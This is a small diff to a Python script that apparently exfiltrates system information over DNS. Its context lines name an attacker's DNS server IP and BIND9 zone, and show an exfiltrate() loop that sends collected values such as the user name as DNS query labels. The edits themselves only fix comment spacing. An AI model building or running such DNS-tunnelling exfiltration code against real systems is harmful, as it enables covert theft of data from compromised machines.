@@ -5,7 +5,7 @@ import os
 import platform
 import subprocess
 
-#IP address of the attacker's DNS server(assumes DNS server is listening here)
+#IP address of the attacker's DNS server (assumes DNS server is listening here)
 ATTACKER_DNS_IP = "10.0.0.1"
 
 #Custom DNS zone configured on the attacker's BIND9 server
@@ -111,7 +111,7 @@ def exfiltrate():
 
     print("[*] Sending data via DNS...")
 
-    #For each piece of information,send a DNS query containing it
+    #For each piece of information, send a DNS query containing it
     for key, val in data.items():
         dns_label = f"{key}-{val}" # e.g., "user-root"
         send_via_dns(dns_label) # Send as part of DNS request
